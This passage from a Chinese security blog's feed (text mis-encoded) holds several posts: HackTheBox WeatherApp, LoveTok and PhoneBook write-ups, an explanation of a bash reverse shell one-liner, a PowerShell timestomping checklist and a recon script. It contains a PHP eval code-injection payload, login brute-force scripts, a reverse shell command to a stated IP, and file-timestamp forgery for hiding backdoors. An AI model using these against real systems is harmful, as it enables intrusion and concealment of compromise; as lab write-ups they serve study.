json=burp0_json)print(resp.text)</code></pre><p>ç™»å½•adminï¼Œè·å¾—flagï¼š</p><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-8.png" alt="Bingo"></p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>æœ€æ—©è§£é¢˜çš„æ—¶å€™æ˜¯æ²¡æœ‰æ³¨æ„åˆ°NodeJSçš„ç‰ˆæœ¬çš„ï¼Œä¸€ç›´å¡åœ¨æ— æ³•æäº¤POSTè¡¨å•è¿™ä¸€æ­¥ï¼Œæœ€åè¿˜æ˜¯çœ‹äº†å…¶ä»–å¤§ä½¬çš„WriteUPã€‚æƒ³äº†ä¸€äº›å¾ˆæŠ½è±¡çš„åŠæ³•ï¼Œä¾‹å¦‚åœ¨æœåŠ¡å™¨ä¸Šè®¾ç½®ä¸€ä¸ªHTMLæ–‡ä»¶ï¼Œè®¿é—®åˆ°è¿™ä¸ªæ–‡ä»¶çš„æ—¶å€™è‡ªåŠ¨æäº¤Formè¡¨å•ã€‚è¿™ä¸ªæ€è·¯èƒ½æˆåŠŸçš„å‰ææ˜¯ï¼ŒæœåŠ¡å™¨ä¼šè§£æHTMLå’ŒJavaScriptã€‚æŠ±ç€è¯•ä¸€è¯•çš„å¿ƒæ€å°è¯•äº†ä¸€ç•ªï¼Œæœ€åç†æ‰€å½“ç„¶çš„å¤±è´¥äº†ã€‚è¿™é‡Œå°†ç”¨åˆ°çš„HTMLä»£ç è®°å½•ä¸‹æ¥ï¼Œæƒå½“æ¶ˆé£ä¸çºªå¿µ(ä»£ç æ˜¯ChatGPTå†™çš„)ã€‚</p><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;è‡ªåŠ¨æäº¤è¡¨å•&lt;/title&gt;    &lt;script type=&quot;text/javascript&quot;&gt;        window.onload = function() &#123;            document.forms[&quot;autoSubmitForm&quot;].submit();        &#125;    &lt;/script&gt;&lt;/head&gt;&lt;body&gt;    &lt;form id=&quot;autoSubmitForm&quot; action=&quot;http://127.0.0.1/register&quot; method=&quot;post&quot;&gt;        &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;admin&quot;&gt;        &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;admin&quot;&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><blockquote><p>PS: ä»Šå¤©ä¸ƒå¤•ï¼Œåœ¨æŠ¤ç½‘ç°åœºçˆ†è‚ä¸‰ç¯‡WriteUPï¼Œæ„Ÿè°¢å¥³æœ‹å‹çš„é¼“èˆBUFFåŠ æŒï¼</p></blockquote><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ul><li><a href="https://www.anquanke.com/post/id/241429">NodeJS ä¸­ Unicode å­—ç¬¦æŸåå¯¼è‡´çš„ HTTP æ‹†åˆ†æ”»å‡»</a></li><li><a href="https://blog.csdn.net/f_cccc/article/details/1164068">HTBä¹‹Weather App</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
            <tag> SSRF </tag>
            
            <tag> æ¼æ´åˆ©ç”¨ </tag>
            
            <tag> HTTP Requestæ‹†åˆ†æ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox LoveTok WriteUP</title>
      <link href="/2023/08/22/HackTheBox-LoveTok-WriteUP/"/>
      <url>/2023/08/22/HackTheBox-LoveTok-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><blockquote><p>True love is tough, and even harder to find. Once the sun has set, the lights close and the bell has rungâ€¦ you find yourself licking your wounds and contemplating human existence. You wish to have somebody important in your life to share the experiences that come with it, the good and the bad. This is why we made LoveTok, the brand new service that accurately predicts in the threshold of milliseconds when love will come knockinâ€™ (at your door). Come and check it out, but donâ€™t try to cheat love because love cheats back. ğŸ’›</p></blockquote><p><img src="/2023/08/22/HackTheBox-LoveTok-WriteUP/image.png" alt="LoveTok"></p><p><img src="/2023/08/22/HackTheBox-LoveTok-WriteUP/image-1.png" alt="Web"></p><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>é¢˜ç›®æœ‰æºç ä¸‹è½½ï¼Œç†åº”æ˜¯ä»æºç ä¸­å¯»æ‰¾æ¼æ´äº†ã€‚<br>æ‰¾æ¥æ‰¾å»ï¼Œåªæœ‰<code>challenge/controllers/TimeController.php</code>ä¸­å­˜åœ¨å¯æ§å‚æ•°<code>$_GET[&#39;format&#39;]</code>ï¼š</p><pre><code class="php">&lt;?phpclass TimeController&#123;    public function index($router)    &#123;        $format = isset($_GET[&#39;format&#39;]) ? $_GET[&#39;format&#39;] : &#39;r&#39;;        $time = new TimeModel($format);        return $router-&gt;view(&#39;index&#39;, [&#39;time&#39; =&gt; $time-&gt;getTime()]);    &#125;&#125;</code></pre><p>è·Ÿè¸ªå®šä½åˆ°<code>TimeModel</code>ç±»ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><pre><code class="php">&lt;?phpclass TimeModel&#123;    public function __construct($format)    &#123;        $this-&gt;format = addslashes($format);        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];        $this-&gt;prediction = &quot;+$&#123;d&#125; day +$&#123;h&#125; hour +$&#123;m&#125; minute +$&#123;s&#125; second&quot;;    &#125;    public function getTime()    &#123;        eval(&#39;$time = date(&quot;&#39; . $this-&gt;format . &#39;&quot;, strtotime(&quot;&#39; . $this-&gt;prediction . &#39;&quot;));&#39;);        return isset($time) ? $time : &#39;Something went terribly wrong&#39;;    &#125;&#125;</code></pre><p>å¾ˆæ˜¾ç„¶ï¼Œè¦ç»•è¿‡<code>addslashes()</code>å‡½æ•°ï¼Œåˆ©ç”¨<code>getTime()</code>ä¸­çš„<code>eval()</code>æ¥RCEäº†ã€‚</p><h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><p>ä»£ç åœ¨<code>addslashes()</code>åæ²¡æœ‰å¯¹ä¼ å…¥çš„å‚æ•°åšå…¶ä»–å¤„ç†ï¼Œä¸å¥½é—­åˆåŒå¼•å·ã€‚</p><p>ä½†æ˜¯å¦‚æœä½¿ç”¨åŠ¨æ€å˜é‡çš„è¯ï¼Œå°±ä¸éœ€è¦é—­åˆåŒå¼•å·äº†ã€‚</p><blockquote><p>åœ¨ PHP ä¸­ï¼Œ{} ç”¨äºå¤æ‚çš„å˜é‡è§£æã€‚å½“å­—ç¬¦ä¸²ä¸­çš„å˜é‡åç§°ä¸å…¶ä»–å­—ç¬¦ç›¸é‚»å¹¶å¯èƒ½å¼•èµ·æ··æ·†æ—¶ï¼Œå¯ä»¥ä½¿ç”¨è¿™ç§è¯­æ³•æ¥æ˜ç¡®åœ°è¡¨ç¤ºå˜é‡åã€‚è€Œ ${} æ˜¯ä¸€ç§ç‰¹æ®Šçš„è¯­æ³•ï¼Œå®ƒå…è®¸ä½ é€šè¿‡ä¸€ä¸ªå­—ç¬¦ä¸²æ¥åŠ¨æ€åœ°ç”Ÿæˆå˜é‡åã€‚<br>â€”â€”ChatGPT</p></blockquote><p>Payloadå¦‚ä¸‹ï¼š</p><pre><code>GET /?format=r$&#123;$&#123;system(ls)&#125;&#125; HTTP/1.1</code></pre><p><img src="/2023/08/22/HackTheBox-LoveTok-WriteUP/image-2.png" alt="ls"></p><p>ä½†æ˜¯<code>addslashes()</code>ä¼šå¯¹ç©ºæ ¼è¿›è¡Œå¤„ç†ï¼Œæˆ‘ä»¬ä¹Ÿå¹¶æ²¡æœ‰åœ¨å½“å‰ç›®å½•ä¸‹æ‰¾åˆ°flagï¼Œæ‰€ä»¥åˆ©ç”¨HTTPå‚æ•°ä¼ å…¥è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œæ˜¯ä¸ªå¥½ä¸»æ„ï¼š</p><pre><code>GET /?format=r$&#123;$&#123;system($_GET[aa])&#125;&#125;&amp;aa=ls%20/ HTTP/1.1</code></pre><p><img src="/2023/08/22/HackTheBox-LoveTok-WriteUP/image-3.png" alt="ls /"></p><p>æ‰¾åˆ°<code>flag</code>:</p><p><img src="/2023/08/22/HackTheBox-LoveTok-WriteUP/image-4.png" alt="flag"></p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><blockquote><p><a href="https://www.jianshu.com/p/7c818ddc5731">PHPå¤æ‚å˜é‡ç»•è¿‡addslashes()ç›´æ¥æ‹¿shell</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
            <tag> ä»£ç æ³¨å…¥ </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox PhoneBook WriteUP</title>
      <link href="/2023/08/22/HackTheBox_PhoneBook_WriteUP/"/>
      <url>/2023/08/22/HackTheBox_PhoneBook_WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p><img src="/2023/08/22/HackTheBox_PhoneBook_WriteUP/image-1.png" alt="Who is lucky enough to be included in the phonebook?"></p><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>é¢˜ç›®ç»™å‡ºçš„ç½‘é¡µæ˜¯è¿™æ ·</p><p><img src="/2023/08/22/HackTheBox_PhoneBook_WriteUP/image-2.png" alt="index"></p><p>çœ‹åˆ°HTMLä¸­æœ‰è¿™æ ·ä¸€æ®µä»£ç ï¼Œè¿˜ä»¥ä¸ºè¿™é¢˜æ˜¯ä¸ªDOM XSS(äº‹å®ä¸Šä¹Ÿç¡®å®æœ‰XSS)</p><pre><code class="HTML">&lt;script&gt;  const queryString = window.location.search;if (queryString) &#123;  const urlParams = new URLSearchParams(queryString);  const message = urlParams.get(&#39;message&#39;);  if (message) &#123;    document.getElementById(&quot;message&quot;).innerHTML = message;    document.getElementById(&quot;message&quot;).style.visibility = &quot;visible&quot;;    &#125;  &#125;&lt;/script&gt;</code></pre><p>ä½†æ˜¯XSSæ˜¯éœ€è¦äººè§¦å‘çš„ï¼Œé¢˜ç›®ä¸­å¹¶æ²¡æœ‰ç»™å‡ºä»»ä½•BOTçš„ä¿¡æ¯ã€‚</p><p>æ‰€ä»¥æœ€ç»ˆçš„è§£æ³•è¦è½åœ¨ç™»å½•åŠŸèƒ½ä¸Šã€‚</p><h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><p>ç™»å½•åŠŸèƒ½å¯ä»¥é€šè¿‡é€šé…ç¬¦<code>*</code>è¿›å…¥ï¼Œç™»å½•æˆåŠŸä¹‹åæ˜¯ä¸€ä¸ªåªæœ‰æœç´¢æ¡†çš„é¡µé¢ï¼ˆè¿™é‡Œå¿˜è®°æˆªå›¾äº†ï¼‰ã€‚æœç´¢åŠŸèƒ½å¯ä»¥æ‰¾åˆ°è‹¥å¹²è´¦æˆ·çš„ä¿¡æ¯ã€‚</p><p><img src="/2023/08/22/HackTheBox_PhoneBook_WriteUP/image-3.png" alt="æœç´¢"></p><p>é¢˜ç›®çš„æç¤ºæ˜¯ï¼š<code>Who is lucky enough to be included in the phonebook?</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥æƒ³åŠæ³•è·å–èƒ½ç™»å½•çš„è´¦å·å¯†ç ã€‚</p><p>ç™»å½•åŠŸèƒ½å¯ä»¥è¯†åˆ«é€šé…ç¬¦ï¼Œæ‰€ä»¥ç›´æ¥å†™è„šæœ¬éå†å°±å¥½äº†ã€‚</p><blockquote><p>userbrute.py</p></blockquote><pre><code class="python">import requestsurl = &quot;http://157.245.43.189:30403/login&quot;value = &#39;&#39;flag = Truewhile(flag):    flag = False    for i in range(33,126,1):        if(chr(i)==&#39;*&#39;):            continue        uname = value + chr(i) + &#39;*&#39;        data = &#123;&quot;username&quot;: uname, &quot;password&quot;: &quot;*&quot;&#125;        resp = requests.post(url, data=data, allow_redirects=False)        print(uname+&#39;\t&#39;+str(resp.status_code))        if(resp.status_code != 302):            continue        if(resp.headers[&#39;Location&#39;] == &#39;/&#39;):            value = value+chr(i)            print(value)            flag = True            break</code></pre><blockquote><p>passbrute.py</p></blockquote><pre><code class="python">import requestsurl = &quot;http://157.245.43.189:30403/login&quot;value = &#39;&#39;flag = Truewhile(flag):    flag = False    for i in range(33,126,1):        if(chr(i)==&#39;*&#39;):            continue        password = value + chr(i) + &#39;*&#39;        data = &#123;&quot;username&quot;: &quot;REESE&quot;, &quot;password&quot;: password&#125;        resp = requests.post(url, data=data, allow_redirects=False)        # print(password+&#39;\t&#39;+str(resp.status_code))        if(resp.status_code != 302):            continue        if(resp.headers[&#39;Location&#39;] == &#39;/&#39;):            value = value+chr(i)            print(value)            flag = True            break</code></pre><p>å–å¾—flagï¼š</p><p><img src="/2023/08/22/HackTheBox_PhoneBook_WriteUP/image-4.png" alt="flag"></p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p><del>çœŸæ­£çš„è§£é¢˜æ€è·¯æ˜¯çœ‹äº†åˆ«äººçš„writeupæ‰æ˜ç™½çš„ï¼Œé€šé…ç¬¦è¿™æ˜¯çœŸæ²¡æƒ³åˆ°â€¦â€¦</del></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
            <tag> æš´åŠ›ç ´è§£ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºLinuxä¸‹åå¼¹Shellå‘½ä»¤çš„è§£é‡Š</title>
      <link href="/2021/04/28/%E5%85%B3%E4%BA%8ELinux%E4%B8%8B%E5%8F%8D%E5%BC%B9Shell%E5%91%BD%E4%BB%A4%E7%9A%84%E8%A7%A3%E9%87%8A/"/>
      <url>/2021/04/28/%E5%85%B3%E4%BA%8ELinux%E4%B8%8B%E5%8F%8D%E5%BC%B9Shell%E5%91%BD%E4%BB%A4%E7%9A%84%E8%A7%A3%E9%87%8A/</url>
      
        <content type="html"><![CDATA[<p>Linuxä¸‹åå¼¹shellæœ€å¸¸ç”¨çš„ä¸€å¥å‘½ä»¤ï¼š</p><pre><code class="shell">bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/192.168.1.1/1337 &lt;&amp;1&#39;</code></pre><p>å¯¹è¿™æ¡å‘½ä»¤çš„ç†è§£ï¼Œä»¥æˆ‘ä¸ªäººç»å†è€Œè¨€ï¼Œå¤§æ¦‚åˆ†ä¸ºå‡ ä¸ªé˜¶æ®µ</p><ol><li>çŸ¥é“æ€ä¹ˆç”¨ï¼Œä½†æ˜¯è®°ä¸ä½ï¼Œç”¨çš„æ—¶å€™å°±ç™¾åº¦ï¼›</li><li>å¤§æ¦‚èƒŒè¿‡äº†ï¼Œä¹Ÿèƒ½ç†è§£å‘½ä»¤æŸäº›éƒ¨åˆ†çš„å«ä¹‰ï¼Œä½†ä»ç„¶ä¸æ¸…ä¸æ¥šï¼›</li><li>å®Œå…¨ç†è§£äº†å‘½ä»¤çš„æ¯ä¸€éƒ¨åˆ†çš„å«ä¹‰ï¼Œå¯ä»¥è„±ç¦»æ­»è®°ç¡¬èƒŒï¼Œå¹¶å†™å‡ºä¸åŒå½¢å¼çš„å‘½ä»¤ï¼›</li></ol><p>è¯´æ¥æƒ­æ„§ï¼Œå…¥è¡Œå¤šå¹´äº†ï¼Œä»Šå¤©æ‰å®Œæˆç¬¬ä¸‰æ­¥ï¼Œè¿™é‡Œä»…ä½œä¸€æ¬¡è®°å½•ã€‚<br>è¯¦ç»†åŸç†ä¸‰è¨€ä¸¤è¯­è¾ƒéš¾è¯´æ¸…ï¼Œè¿™é‡Œç®€å•æç‚¼ä¸€ä¸‹ä¸»è¦çŸ¥è¯†ç‚¹ã€‚</p><hr><p>å‰ç½®ç†è®ºï¼š</p><ol><li><strong>Linuxä¸‹çš„ä¸€åˆ‡éƒ½æ˜¯æ–‡ä»¶</strong>ï¼›</li><li>Linuxä¸­çš„æ–‡ä»¶æè¿°ç¬¦ï¼š</li></ol><ul><li>æ ‡å‡†è¾“å…¥ - 0 ï¼ˆé»˜è®¤è®¾å¤‡é”®ç›˜ï¼‰</li><li>æ ‡å‡†è¾“å‡º - 1 ï¼ˆé»˜è®¤è®¾å¤‡æ˜¾ç¤ºå™¨ï¼‰</li><li>é”™è¯¯è¾“å‡º - 2 ï¼ˆé»˜è®¤è®¾å¤‡æ˜¾ç¤ºå™¨ï¼‰</li></ul><ol start="3"><li>bash åœ¨æ‰§è¡Œä¸€æ¡æŒ‡ä»¤çš„æ—¶å€™ï¼Œé¦–å…ˆä¼šæ£€æŸ¥å‘½ä»¤ä¸­å­˜ä¸å­˜åœ¨é‡å®šå‘çš„ç¬¦å·ï¼Œå¦‚æœå­˜åœ¨é‚£ä¹ˆé¦–å…ˆå°†æ–‡ä»¶æè¿°ç¬¦é‡å®šå‘ï¼Œç„¶ååœ¨æŠŠé‡å®šå‘å»æ‰ï¼Œæ‰§è¡ŒæŒ‡ä»¤ã€‚</li></ol><hr><p>é‚£ä¹ˆï¼Œä¸‹é¢ç®€å•æ‹†è§£ä¸€ä¸‹åå¼¹shellçš„å‘½ä»¤<br><code>bash -c</code>ï¼šä¸è§£é‡Šäº†ï¼›<br><code>bash -i</code>ï¼šè¡¨ç¤ºå¯åŠ¨ä¸€ä¸ªäº¤äº’å¼çš„Shellï¼›<br><code>&amp;&gt;</code>ï¼šè¡¨ç¤ºå°†æ‰€æœ‰è¾“å‡ºé‡å®šå‘ï¼›<br><code>/dev/tcp/ip/port</code>ï¼šè¡¨ç¤ºç›®æ ‡çš„åœ°å€*(Linuxä¸‹ä¸€åˆ‡çš†æ˜¯æ–‡ä»¶)*ï¼›<br><code>&lt;&amp;1</code>ï¼šè¡¨ç¤ºå°†æ ‡å‡†è¾“å…¥é‡å®šå‘è‡³æ ‡å‡†è¾“å‡ºçš„ç›®æ ‡ï¼›</p><p>ç®€è€Œè¨€ä¹‹ï¼Œ<code>&amp;&gt;</code>å®ç°äº†å‘½ä»¤è¾“å…¥åœ¨æ”»å‡»ç«¯å®Œæˆï¼Œ<code>&lt;&amp;1</code>å®ç°äº†å‘½ä»¤ç»“æœè¾“å‡ºåœ¨æ”»å‡»ç«¯ã€‚</p><hr><p>å‚è€ƒèµ„æ–™ï¼š</p><ul><li><a href="https://item.jd.com/12443890.html">ã€Šé¸Ÿå“¥çš„Linuxç§æˆ¿èœã€‹</a></li><li><a href="https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/">Linuxåå¼¹shellï¼ˆä¸€ï¼‰æ–‡ä»¶æè¿°ç¬¦ä¸é‡å®šå‘</a></li><li><a href="https://www.k0rz3n.com/2018/08/05/Linux%20%E5%8F%8D%E5%BC%B9shell%20%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/">Linux åå¼¹shellï¼ˆäºŒï¼‰åå¼¹shellçš„æœ¬è´¨</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> åŸºç¡€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ©ç”¨Powershellä¿®æ”¹æ–‡ä»¶/æ–‡ä»¶å¤¹æ—¶é—´å±æ€§</title>
      <link href="/2021/04/09/%E6%89%B9%E9%87%8F%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6-%E6%96%87%E4%BB%B6%E5%A4%B9%E6%97%B6%E9%97%B4%E5%B1%9E%E6%80%A7/"/>
      <url>/2021/04/09/%E6%89%B9%E9%87%8F%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6-%E6%96%87%E4%BB%B6%E5%A4%B9%E6%97%B6%E9%97%B4%E5%B1%9E%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="åº”ç”¨åœºæ™¯"><a href="#åº”ç”¨åœºæ™¯" class="headerlink" title="åº”ç”¨åœºæ™¯"></a>åº”ç”¨åœºæ™¯</h2><ul><li>åé—¨éšè—</li><li>èœœç½æ­å»º</li><li>é’“é±¼&#x2F;æ°´å‘æ”»å‡»</li></ul><h2 id="æŠ€æœ¯ç»†èŠ‚"><a href="#æŠ€æœ¯ç»†èŠ‚" class="headerlink" title="æŠ€æœ¯ç»†èŠ‚"></a>æŠ€æœ¯ç»†èŠ‚</h2><h3 id="å•æ–‡ä»¶æ—¶é—´å±æ€§ä¿®æ”¹"><a href="#å•æ–‡ä»¶æ—¶é—´å±æ€§ä¿®æ”¹" class="headerlink" title="å•æ–‡ä»¶æ—¶é—´å±æ€§ä¿®æ”¹"></a>å•æ–‡ä»¶æ—¶é—´å±æ€§ä¿®æ”¹</h3><pre><code class="powershell">#æœ€åè®¿é—®æ—¶é—´$(Get-Item &quot;C:/path/to/yourfile&quot;).LastAccessTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)#æœ€åä¿å­˜æ—¶é—´$(Get-Item &quot;C:/path/to/yourfile&quot;).LastWriteTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)#æ–‡ä»¶åˆ›å»ºæ—¶é—´$(Get-Item &quot;C:/path/to/yourfile&quot;).CreationTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)</code></pre><h3 id="å¤šæ–‡ä»¶æ—¶é—´å±æ€§æ‰¹é‡ä¿®æ”¹"><a href="#å¤šæ–‡ä»¶æ—¶é—´å±æ€§æ‰¹é‡ä¿®æ”¹" class="headerlink" title="å¤šæ–‡ä»¶æ—¶é—´å±æ€§æ‰¹é‡ä¿®æ”¹"></a>å¤šæ–‡ä»¶æ—¶é—´å±æ€§æ‰¹é‡ä¿®æ”¹</h3><pre><code class="powershell">#å½“å‰ç›®å½•æ‰€æœ‰æ–‡ä»¶åŠæ–‡ä»¶å¤¹æ—¶é—´å±æ€§ä¿®æ”¹foreach($n in $(Get-ChildItem).Name)&#123;$(Get-Item $n).LastAccessTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).LastWriteTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).CreationTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)&#125;#ä»…ä¿®æ”¹å½“å‰ç›®å½•æ–‡ä»¶çš„æ—¶é—´å±æ€§ï¼ˆä¸åŒ…å«æ–‡ä»¶å¤¹ï¼‰foreach($n in $(Get-ChildItem -File).Name)&#123;$(Get-Item $n).LastAccessTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).LastWriteTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).CreationTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)&#125;#ä»…ä¿®æ”¹å½“å‰ç›®å½•æ–‡ä»¶å¤¹çš„æ—¶é—´å±æ€§ï¼ˆä¸åŒ…å«æ–‡ä»¶ï¼‰foreach($n in $(Get-ChildItem -Directory).Name)&#123;$(Get-Item $n).LastAccessTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).LastWriteTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).CreationTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)&#125;#ä¿®æ”¹å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶åŠæ–‡ä»¶å¤¹çš„æ—¶é—´å±æ€§ï¼ˆåŒ…æ‹¬å­æ–‡ä»¶å¤¹ï¼‰foreach($n in $(Get-ChildItem -Recurse).FullName)&#123;$(Get-Item $n).LastAccessTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).LastWriteTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).CreationTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)&#125;#å°†å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶åŠæ–‡ä»¶å¤¹æ—¶é—´å±æ€§è®¾ç½®ä¸ºéšæœºæ—¶é—´#ç¤ºä¾‹æ—¶é—´éšæœºèŒƒå›´ä¸º2019/1/2è‡³æ“ä½œç³»ç»Ÿå½“å‰æ—¶é—´foreach($n in $(Get-ChildItem -Recurse).FullName)&#123;$(Get-Item $n).LastAccessTime=$(Get-Random -Minimum $(Get-Date &quot;2019/1/2&quot;).Ticks -Maximum $(Get-Date).Ticks |Get-Date)$(Get-Item $n).LastWriteTime=$(Get-Random -Minimum $(Get-Date &quot;2019/1/2&quot;).Ticks -Maximum $(Get-Date).Ticks |Get-Date)$(Get-Item $n).CreationTime=$(Get-Random -Minimum $(Get-Date &quot;2019/1/2&quot;).Ticks -Maximum $(Get-Date).Ticks |Get-Date)&#125; </code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CheckList </tag>
            
            <tag> æ¬ºéª— </tag>
            
            <tag> powershell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€ä¸ªGet-Titleçš„è‡ªæˆ‘ä¿®å…»</title>
      <link href="/2021/01/26/%E4%B8%80%E4%B8%AAGet-Title%E5%BC%95%E5%87%BA%E7%9A%84%E5%9D%91/"/>
      <url>/2021/01/26/%E4%B8%80%E4%B8%AAGet-Title%E5%BC%95%E5%87%BA%E7%9A%84%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p>æœ€è¿‘è¦æ•´ç†å¤§é‡çš„ç½‘é¡µèµ„æ–™ï¼Œåˆšå¥½å®Œå–„ä¸€ä¸‹ä»¥å‰å†™çš„get-titleè„šæœ¬ã€‚<br>ç›®æ ‡ï¼šè·å–æ‰€æœ‰URLå¯¹åº”ç½‘é¡µçš„Titleï¼Œå¹¶ä»¥å‹å¥½çš„æ ¼å¼è¾“å‡ºè‡³æ–‡ä»¶ã€‚<br>æ­¤è„šæœ¬åŸæ¥æ˜¯æ¸—é€çš„æ—¶å€™æç½‘æ®µç”¨çš„ï¼ŒæŠŠæ‰«å‡ºæ¥çš„Webçš„titleåˆ—ä¸¾å‡ºæ¥ï¼Œä»è€Œå¯¹è‡ªå·±çš„ç›®æ ‡æœ‰ä¸ªå¤§è‡´çš„æ¦‚å¿µã€‚ä½†æ˜¯æ—©å…ˆçš„ç‰ˆæœ¬åªèƒ½è¯´æ˜¯å¯ä»¥å°†å°±ç€ç”¨ï¼Œå¾€å¾€è¾“å‡ºçš„æ ¼å¼ä¹±ä¸ƒå…«ç³Ÿï¼Œåˆšå¥½å€Ÿç€è¿™æ¬¡æœºä¼šé‡å†™ä¸€ä¸‹ã€‚ä¹Ÿé¡ºä¾¿å°†å…¶ä»python2è¿‡æ¸¡åˆ°python3ã€‚</p><h1 id="0x01-ç‰ˆæœ¬å¯¹æ¯”"><a href="#0x01-ç‰ˆæœ¬å¯¹æ¯”" class="headerlink" title="0x01 ç‰ˆæœ¬å¯¹æ¯”"></a>0x01 ç‰ˆæœ¬å¯¹æ¯”</h1><p>æ—©æœŸç‰ˆæœ¬ï¼š</p><pre><code class="python">import requestsfrom bs4 import BeautifulSoupfrom threading import Threadfrom Queue import Queueimport sysimport timeimport signalimport chardetdef getTitle(line):    try:        line=line.strip()        re = requests.get(line, timeout=2)        ret2.write(line + &#39;\n&#39;)        print line+&#39;\t\t&#39;+str(re.status_code)        if re.status_code==200:            text=BeautifulSoup(re.content,&#39;html.parser&#39;)            titles=text.find(&#39;title&#39;)            title=str(titles)            ret.write(line+&#39;\t\t&#39;+title+&#39;\n&#39;)        else:            ret.write(line + &#39;\t\t&#39; + &#39;Error Code:&#39; + re.status_code + &#39;\n&#39;)    except requests.exceptions.Timeout:        ret2.write(line + &#39;\terror\n&#39;)        print line+&#39;\t\ttime out&#39;        ret.write(line+&#39;\t\t&#39;+ &#39;Time out\n&#39;)class Worker(Thread):    def __init__(self, taskQueue):        Thread.__init__(self)        self.setDaemon(True)        self.taskQueue = taskQueue        self.start()    def run(self):        while 1:            try:                callable, args, kwds = self.taskQueue.get(block=False)                callable(*args, **kwds)            except:                breakclass ThreadPool:    def __init__(self):        self.threads = []        self.taskQueue = Queue()        self.threadNum = num_thread        self.__create_taskqueue()        self.__create_threadpool(self.threadNum)    def __create_taskqueue(self):        f = open(&quot;target.txt&quot;, &#39;r&#39;)        lines = f.readlines()        for line in lines:            self.add_task(getTitle, line)        f.close()    def __create_threadpool(self, threadNum):        for i in range(threadNum):            thread = Worker(self.taskQueue)            self.threads.append(thread)    def add_task(self, callable, *args, **kwds):        self.taskQueue.put((callable, args, kwds))    def new_complete(self):        while 1:            